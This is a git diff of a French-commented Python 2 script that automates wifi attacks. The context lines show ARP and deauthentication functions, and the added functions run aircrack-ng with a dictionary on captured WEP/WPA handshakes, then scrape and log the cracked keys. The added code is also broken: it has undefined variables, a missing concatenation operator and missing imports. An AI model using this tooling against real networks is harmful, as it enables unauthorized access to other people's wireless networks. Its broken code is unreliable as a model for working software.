@@ -6,6 +6,7 @@ import os
 import signal
 import subprocess
 import logging
+import threading
 
 """
     Pour lancer mettre la clé wifi en monitoring (devient alors mon0)
@@ -94,7 +95,7 @@ def arp_attack(registered_network):
 """
 def aircrack_final_wep(datafile_path):
     logging.info("Applying aircrack for WEP on %s", datafile_path)
-    cmd = "aircrack-ng " + datafile_path + "/*.cap"
+    cmd = "aircrack-ng " + datafile_path + "/*.cap > " + datafile_path + ".result"
 
     FNULL = open(os.devnull, 'w')
     pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
@@ -102,7 +103,7 @@ def aircrack_final_wep(datafile_path):
 
 def aircrack_final_wpa(datafile_path):
     logging.info("Applying aircrack for WPA on %s", datafile_path)
-    cmd = "aircrack-ng -w dictionnaire/* " + datafile_path + "/*.cap"
+    cmd = "aircrack-ng -w dictionnaire/* " + datafile_path + "/*.cap > " +  datafile_path + ".result"
 
     FNULL = open(os.devnull, 'w')
     pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
@@ -117,3 +118,47 @@ def deauthentication_attack(box, client):
     FNULL = open(os.devnull, 'w')
     pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
     return pro.pid
+
+def result_aircrack_wep(data_file_path):
+    t_aircrack = threading.Thread(target=aircrack_final_wep, args=(datafile_path,))
+    key_file_name = datafile_path + ".result"
+    KEY = ""
+    t.start()
+    while KEY == "":
+        KEY = get_key(datafile_path)
+        time.sleep(5)
+    os.remove(key_file_name)
+    cmd = "echo \" WEP_box_path : " + datafile_path " with key " + KEY + "\" >> key.result"
+    FNULL = open(os.devnull, 'w')
+    pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
+    return pro.pid
+
+def result_aircrack_wpa(datafile_path):
+    t_aircrack = threading.Thread(target=aircrack_final_wpa, args=(datafile_path,))
+    key_file_name = datafile_path + ".result"
+    KEY = ""
+    while KEY == "" :
+        if t_aircrack.isAlive() == False :
+            print 'Lancement de aircrack-ng'
+            t_aircrack = threading.Thread(target=aircrack_final_wpa, args=(datafile_path,))
+            t_aircrack.start()
+        KEY = get_key(datafile_path)
+        time.sleep(5)
+    os.remove(key_file_name)
+    cmd = "echo \" WPA_box_path : " + datafile_path " with key " + KEY + "\" >> key.result"
+    FNULL = open(os.devnull, 'w')
+    pro = subprocess.Popen(cmd, stdout=FNULL, shell=True, stderr=subprocess.STDOUT, preexec_fn=os.setsid)
+    return pro.pid
+
+def get_key(datafile_path):
+    file_name = datafile_path + ".result"
+    fichier = open(file_name, 'r')
+    key = ""
+    pattern = re.compile("KEY FOUND! \[ [^!]+ \]")
+    file_line = fichier.readline()
+    while file_line != "" and key == "":
+        res = pattern.search(file_line)
+        if res != None:
+            key = file_line[res.start():res.end()]
+        file_line = fichier.readline()
+    return key
